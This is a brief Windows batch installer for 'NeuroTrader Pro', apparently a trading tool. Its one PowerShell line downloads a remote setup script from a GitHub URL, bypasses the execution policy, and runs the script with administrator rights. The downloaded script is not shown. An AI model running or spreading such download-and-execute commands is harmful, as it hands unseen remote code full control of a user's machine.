@echo off
rem NeuroTrader Pro installer - right-click > Run as administrator (or just double-click)
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12'; Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/sejek005-afk/TRADE/main/engine/scripts/setup_vps.ps1' -OutFile \"$env:TEMP\ntpro_setup.ps1\"; Start-Process powershell -Verb RunAs -ArgumentList ('-NoProfile -ExecutionPolicy Bypass -NoExit -File \"' + $env:TEMP + '\ntpro_setup.ps1\"')"
